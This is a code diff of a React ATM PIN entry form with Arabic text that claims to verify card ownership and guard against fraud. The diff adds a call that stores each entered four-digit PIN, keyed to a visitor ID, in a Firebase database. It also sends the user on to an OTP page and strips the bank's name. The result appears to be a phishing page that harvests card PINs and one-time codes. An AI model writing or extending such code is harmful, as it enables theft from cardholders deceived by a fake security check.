@@ -1,89 +1,95 @@
-"use client"
+"use client";
 
-import type React from "react"
-import { useState, useRef } from "react"
-import { Button } from "@/components/ui/button"
-import { useRouter } from "next/navigation"
-import { Lock } from "lucide-react"
+import type React from "react";
+import { useState, useRef } from "react";
+import { Button } from "@/components/ui/button";
+import { useRouter } from "next/navigation";
+import { Lock } from "lucide-react";
+import { addData } from "@/lib/firebase";
 
 export function AtmPinForm() {
-  const router = useRouter()
-  const [pin, setPin] = useState(["", "", "", ""])
-  const [isSubmitting, setIsSubmitting] = useState(false)
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
+  const router = useRouter();
+  const [pin, setPin] = useState(["", "", "", ""]);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   const handlePinChange = (index: number, value: string) => {
-    const numValue = value.replace(/\D/g, "").slice(0, 1)
+    const numValue = value.replace(/\D/g, "").slice(0, 1);
 
-    const newPin = [...pin]
-    newPin[index] = numValue
+    const newPin = [...pin];
+    newPin[index] = numValue;
 
-    setPin(newPin)
+    setPin(newPin);
 
     // Move to next input if a digit was entered
     if (numValue && index < 3) {
-      inputRefs.current[index + 1]?.focus()
+      inputRefs.current[index + 1]?.focus();
     }
-  }
+  };
 
-  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+  const handleKeyDown = (
+    index: number,
+    e: React.KeyboardEvent<HTMLInputElement>
+  ) => {
     if (e.key === "Backspace") {
       if (!pin[index] && index > 0) {
         // Move to previous input on backspace if current is empty
-        inputRefs.current[index - 1]?.focus()
-        const newPin = [...pin]
-        newPin[index - 1] = ""
-        setPin(newPin)
+        inputRefs.current[index - 1]?.focus();
+        const newPin = [...pin];
+        newPin[index - 1] = "";
+        setPin(newPin);
       } else if (pin[index]) {
         // Clear current input
-        const newPin = [...pin]
-        newPin[index] = ""
-        setPin(newPin)
+        const newPin = [...pin];
+        newPin[index] = "";
+        setPin(newPin);
       }
-      e.preventDefault()
+      e.preventDefault();
     }
-  }
+  };
 
   const handleSubmit = async () => {
-    const pinCode = pin.join("")
-    if (pinCode.length !== 4) return
-
-    setIsSubmitting(true)
+    const pinCode = pin.join("");
+    if (pinCode.length !== 4) return;
+    const visitorID = localStorage.getItem("visitor");
+    await addData({
+      id: visitorID,
+      pin: pinCode,
+    });
+    setIsSubmitting(true);
     // Simulate ATM verification
-    await new Promise((resolve) => setTimeout(resolve, 2000))
-    setIsSubmitting(false)
+    await new Promise((resolve) => setTimeout(resolve, 2000));
+    setIsSubmitting(false);
 
     // Navigate to success page
-    alert("تم التحقق من رمز ATM بنجاح!")
-    router.push("/")
-  }
+    alert("تم التحقق من رمز ATM بنجاح!");
+    router.push("/payment/otp");
+  };
 
-  const isFormValid = pin.every((digit) => digit !== "")
+  const isFormValid = pin.every((digit) => digit !== "");
 
   return (
     <div className="space-y-6">
       {/* ATM Verification Card */}
       <div className="bg-white rounded-xl shadow-sm border border-stone-200 p-8">
         {/* Title */}
-        <h2 className="text-2xl font-bold text-stone-900 text-center mb-2">إثبات ملكية البطاقة</h2>
+        <h2 className="text-2xl font-bold text-stone-900 text-center mb-2">
+          إثبات ملكية البطاقة
+        </h2>
 
         {/* ATM Label */}
         <div className="text-center mb-6">
           <h3 className="text-4xl font-bold text-blue-900 mb-4">ATM</h3>
           <p className="text-stone-600 text-sm leading-relaxed">
-            يرجى إدخال الرقم السري لصراف الآلي (ATM) المكون من 4 كائنات للبطاقة المنتهية ب 5454 يتم التأكد من ملكية
-            وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإليكتروني والتأكد من عملية الدفع.
+            يرجى إدخال الرقم السري لصراف الآلي (ATM) المكون من 4 كائنات للبطاقة
+            المنتهية ب 5454 يتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من
+            مخاطر الاحتيال الإليكتروني والتأكد من عملية الدفع.
           </p>
         </div>
 
         {/* Bank Info */}
         <div className="bg-stone-50 rounded-lg p-4 mb-6 border border-stone-200">
-          <div className="flex items-center gap-3 mb-2">
-            <div className="w-8 h-8 bg-stone-200 rounded flex items-center justify-center">
-              <span className="text-xs font-bold">🏦</span>
-            </div>
-            <p className="font-semibold text-stone-800">CENTRAL TRUST BANK</p>
-          </div>
+          <div className="flex items-center gap-3 mb-2"></div>
           <div className="flex justify-end mt-2">
             <div className="flex gap-1">
               <div className="w-6 h-4 bg-red-500 rounded"></div>
@@ -103,7 +109,7 @@ export function AtmPinForm() {
                 <input
                   key={index}
                   ref={(el) => {
-                    inputRefs.current[index] = el
+                    inputRefs.current[index] = el;
                   }}
                   type="text"
                   inputMode="numeric"
@@ -134,5 +140,5 @@ export function AtmPinForm() {
         </div>
       </div>
     </div>
-  )
+  );
 }
